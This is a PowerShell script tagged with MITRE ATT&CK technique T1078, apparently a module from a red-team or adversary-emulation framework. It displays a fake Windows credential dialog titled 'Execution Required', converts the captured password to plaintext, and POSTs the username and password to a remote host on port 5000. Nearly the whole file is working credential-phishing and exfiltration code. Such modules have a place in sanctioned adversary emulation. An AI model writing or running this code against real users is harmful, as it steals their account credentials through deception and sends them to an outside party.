#Title: get-credentials
#Technique: T1078
#Tactic: TA0001
function get-credentials{
  param(
    [Parameter(Mandatory=$false)]
    [String] $title,
    [Parameter(Mandatory=$false)]
    [String] $message,
    [Parameter(Mandatory=$false)]
    [String] $domain,
    [Switch] $persistent
  )

  if (-not $domain)
  {
    $domain = ""
  }

  #prompt for credentials
  $credential = $host.ui.PromptForCredential($title, $message, "", $domain)

  if($credential.UserName -ne $null -and $credential.Password -ne $null)
  {
      $passConvert = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password);
      $noSecurePass = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($passConvert);
      $result = "User: " + $credential.UserName + " - Password: " + $noSecurePass
  }
  else
  {
      $result =  "User exit prompt for credentials"
  }

  $good = $credential.UserName -ne $null -and $credential.Password -ne $null


  return @{results=$result;success=$good;data=@{user=$credential.UserName;pass=$noSecurePass}}

}

#Main program
$execute = {}

#GiveMeData if needed

#get-credentials
$execute = get-credentials -title "Execution Required" -message "An Application needs execute a process"

#PutData if needed
#Put User and Password User
if($execute.success)
{
    $uri = "http://"+$global:remoteip+":5000/putdata"
    $resp = invoke-webrequest -UseBasicParsing -Method POST -Body @{id=$global:id;user=$execute.data.user;pass=$execute.data.pass} $uri
}

return @{results=$execute.results;success=$execute.success}
